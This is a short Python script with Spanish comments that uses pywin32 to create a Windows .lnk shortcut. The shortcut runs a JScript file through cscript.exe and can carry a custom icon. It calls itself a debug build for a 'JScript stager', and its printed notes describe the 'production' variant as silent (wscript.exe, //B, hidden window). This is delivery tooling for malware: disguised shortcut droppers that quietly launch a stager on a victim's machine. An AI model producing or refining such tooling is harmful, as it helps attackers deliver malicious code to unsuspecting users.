#!/usr/bin/env python3
"""
Crear .lnk que ejecuta JScript con VENTANA VISIBLE (para debug)
"""

import os
import sys
from pathlib import Path

try:
    import win32com.client
except ImportError:
    print("[❌] Instalar: pip install pywin32")
    sys.exit(1)

def create_debug_lnk(js_path, output_lnk, icon_path=None):
    """Crear .lnk que ejecuta JScript con cscript (VISIBLE)"""
    
    js_path = str(Path(js_path).absolute())
    output_lnk = str(Path(output_lnk).absolute())
    working_dir = str(Path(js_path).parent)
    js_filename = Path(js_path).name
    
    print(f"[🔗] Creando acceso directo DEBUG para JScript...")
    print(f"    JS: {js_filename}")
    print(f"    LNK: {output_lnk}")
    
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(output_lnk)
    
    # Target: cscript.exe (console script host - MUESTRA VENTANA)
    shortcut.TargetPath = r"C:\Windows\System32\cscript.exe"
    
    # Arguments: SIN //B para ver la consola
    shortcut.Arguments = f'//Nologo "{js_filename}"'
    
    # Working directory: donde está el JS
    shortcut.WorkingDirectory = working_dir
    
    # Ventana NORMAL (1 = normal, 7 = minimizada/oculta)
    shortcut.WindowStyle = 1
    
    # Icono
    if icon_path and os.path.exists(icon_path):
        shortcut.IconLocation = f"{os.path.abspath(icon_path)},0"
        print(f"    Icono: {icon_path}")
    
    shortcut.Save()
    
    print(f"[✅] LNK DEBUG creado exitosamente")
    print(f"\n[💡] Diferencias con producción:")
    print(f"   🔍 cscript.exe (muestra consola) vs wscript.exe (silencioso)")
    print(f"   🔍 SIN //B flag (modo batch)")
    print(f"   🔍 WindowStyle = 1 (normal) vs 7 (oculto)")
    print(f"   🔍 Verás todos los WScript.Echo en la consola")

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Crear .lnk DEBUG para JScript stager')
    parser.add_argument('--js', required=True, help='Ruta al stager .js')
    parser.add_argument('--output', required=True, help='Nombre del .lnk de salida')
    parser.add_argument('--icon', help='Ruta al icono .ico')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.js):
        print(f"[❌] No se encuentra: {args.js}")
        sys.exit(1)
    
    create_debug_lnk(args.js, args.output, args.icon)
